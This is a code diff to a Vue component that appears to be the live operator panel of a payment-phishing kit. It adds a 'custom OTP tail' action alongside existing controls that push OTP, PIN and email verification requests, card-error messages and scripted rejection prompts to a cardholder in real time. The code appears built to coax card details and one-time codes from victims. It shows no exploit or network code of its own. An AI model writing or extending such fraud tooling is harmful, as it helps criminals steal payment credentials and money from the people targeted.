@@ -13,6 +13,7 @@ const emit = defineEmits<{
 // Card submitted, no OTP yet
 const cardActions = [
   { label: 'OTP验证', value: 'otp_verify' as Api.Payment.OperatorAction },
+  { label: 'OTP验证（自定义尾号）', value: 'custom_otp_tail' as Api.Payment.OperatorAction },
   { label: '换卡支付', value: 'change_card' as Api.Payment.OperatorAction },
   { label: '卡片错误', value: 'card_error' as Api.Payment.OperatorAction },
   { label: '自定义提示', value: 'custom_prompt' as Api.Payment.OperatorAction },
@@ -31,6 +32,7 @@ const otpActions = [
 // Default (live / other statuses)
 const defaultActions = [
   { label: 'OTP验证', value: 'otp_verify' as Api.Payment.OperatorAction },
+  { label: 'OTP验证（自定义尾号）', value: 'custom_otp_tail' as Api.Payment.OperatorAction },
   { label: '自定义OTP验证', value: 'custom_otp_verify' as Api.Payment.OperatorAction },
   { label: '邮箱验证', value: 'email_verify' as Api.Payment.OperatorAction },
   { label: 'PIN验证', value: 'pin_verify' as Api.Payment.OperatorAction },
@@ -57,6 +59,12 @@ function handleSelect(key: string) {
   if (key === 'custom_prompt' || key === 'change_card_prompt') {
     pendingAction.value = key as Api.Payment.OperatorAction;
     promptMessage.value = key === 'change_card_prompt' ? '请更换卡片重新支付' : '';
+    showPrompt.value = true;
+    return;
+  }
+  if (key === 'custom_otp_tail') {
+    pendingAction.value = key as Api.Payment.OperatorAction;
+    promptMessage.value = '';
     showPrompt.value = true;
     return;
   }
@@ -105,11 +113,11 @@ function statusLabel(status: Api.Payment.SessionStatus, hasOtp?: boolean) {
 
     <NModal :show="showPrompt" :mask-closable="false" @update:show="(v: boolean) => { if (!v) cancelPrompt(); }">
       <div class="prompt-modal">
-        <h4>{{ pendingAction === 'change_card_prompt' ? '自定义提示（换卡支付）' : '自定义提示' }}</h4>
+        <h4>{{ pendingAction === 'change_card_prompt' ? '自定义提示（换卡支付）' : pendingAction === 'custom_otp_tail' ? 'OTP验证（自定义尾号）' : '自定义提示' }}</h4>
         <NInput
           v-model:value="promptMessage"
           type="textarea"
-          placeholder="输入推送给用户的提示信息（前台显示为拒绝+文案）"
+          :placeholder="pendingAction === 'custom_otp_tail' ? '输入手机尾号后4位' : '输入推送给用户的提示信息（前台显示为拒绝+文案）'"
           :autosize="{ minRows: 3, maxRows: 6 }"
         />
         <div class="prompt-actions">
